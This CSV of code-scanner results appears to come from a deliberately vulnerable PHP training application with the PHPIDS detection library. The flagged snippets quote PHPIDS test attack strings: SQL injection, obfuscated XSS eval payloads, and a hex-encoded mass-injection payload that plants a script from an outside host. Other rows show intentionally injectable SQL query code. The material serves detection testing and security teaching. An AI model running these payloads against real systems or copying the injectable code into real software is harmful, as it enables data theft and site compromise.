"file_type","file","line_number","match","name","snippet","group"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","908","41524520405420766172636861722832","MD5","906-        $exploits[] = ""asd' union distinct(select null,password,null from users)--a "";907-        $exploits[] = ""asd' union distinct ( select null,password,(null)from user )-- a "";908:        $exploits[] = 'DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(@S);';909-        $exploits[] = ""asaa';SELECT[asd]FROM[asd]"";910-        $exploits[] = ""asd'; select [column] from users "";911-        $exploits[] = ""0x31 union select @@version,username,password from users "";","hashes"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","908","4043207661726368617228343030302920444543","SHA1","906-        $exploits[] = ""asd' union distinct(select null,password,null from users)--a "";907-        $exploits[] = ""asd' union distinct ( select null,password,(null)from user )-- a "";908:        $exploits[] = 'DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(@S);';909-        $exploits[] = ""asaa';SELECT[asd]FROM[asd]"";910-        $exploits[] = ""asd'; select [column] from users "";911-        $exploits[] = ""0x31 union select @@version,username,password from users "";","hashes"
"php","./external/phpids/0.6/lib/IDS/Converter.php","384","base64_decode(","base64_decode(","382-        foreach ($matches[1] as $item) {383-            if (isset($item) && !preg_match('/[a-f0-9]{32}/i', $item)) {384:                $value = str_replace($item, base64_decode($item), $value);385-            }386-        }387-","payload_obfuscators"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","250","\$\$","\$\$","248-                            {};;249-                            {v =(0)?z:z}v={_$:z+'aler'+z};250:                            {k =(0)?z:z}k={_$$:v._$+'t(x)'+z};251-                            x=''+y.y+'l';{};252-253-                            n=.1[x];254:                            n(k._$$)"";255-        $exploits[] = ""ä=/ä/!=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);$=.0[b];a=$;a(c)"";256-        $exploits[] = 'x=/x/257-                            $x=!!1?\'ash\':xx","payload_obfuscators"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","375","\$\$","\$\$","372-                        $a=$a=$b';373-        $exploits[] = ""123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);"";374-        $exploits[] = '$_ = !1-1 ? 0[""\ev\al""""](""\a\l\ert\(1\)"""") : 0';375:        $exploits[] = ""$$$[0] = !1-1 ? 'eva' : 0376-377:                        $$$[1] = !1-1 ? 'l' : 0378-379:                        $$$['\jo\in']([])"";380-        $exploits[] = 'x=/eva/i[-1]381-                        $y=/nam/i[-1]382-                        $x$_0=(0)[x+\'l\']","payload_obfuscators"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","565","\$\$","\$\$","562-        $exploits[] = 'eval.call(this,unescape.call(this,location))';563-        $exploits[] = 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))';564-        $exploits[] = '_=eval,__=unescape,___=document.URL,_(__(___))';565:        $exploits[] = '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))';566-        $exploits[] = '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)';567-        $exploits[] = 'ev\al.call(this,unescape.call(this,location))';568-        $exploits[] = 'setTimeout//","payload_obfuscators"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/ChildDef/Table.php","66","\$\$","\$\$","63-                        case 'tfoot':64-                            // access the appropriate variable, $thead or $tfoot65-                            $var = $collection[$tag_index]->name;66:                            if ($$var === false) {67:                                $$var = $collection;68-                            } else {69-                                // transmutate the first and less entries into70-                                // tbody tags, and then put into content","payload_obfuscators"
"php","./vulnerabilities/sqli/source/medium.php","3","$_GET","$_GET","2-3:if (isset($_GET['Submit'])) {4-5-	// Retrieve data6-7:	$id = $_GET['id'];8-	$id = mysql_real_escape_string($id);9-10-	$getid = ""SELECT first_name, last_name FROM users WHERE user_id = $id"";","form_data"
"php","./vulnerabilities/sqli/source/low.php","3","$_GET","$_GET","1-<?php	2-3:if(isset($_GET['Submit'])){4-	5-	// Retrieve data6-	7:	$id = $_GET['id'];8-9-	$getid = ""SELECT first_name, last_name FROM users WHERE user_id = '$id'"";10-	$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );","form_data"
"php","./vulnerabilities/sqli/source/high.php","3","$_GET","$_GET","1-<?php	2-3:if (isset($_GET['Submit'])) {4-5-	// Retrieve data6-7:	$id = $_GET['id'];8-	$id = stripslashes($id);9-	$id = mysql_real_escape_string($id);10-","form_data"
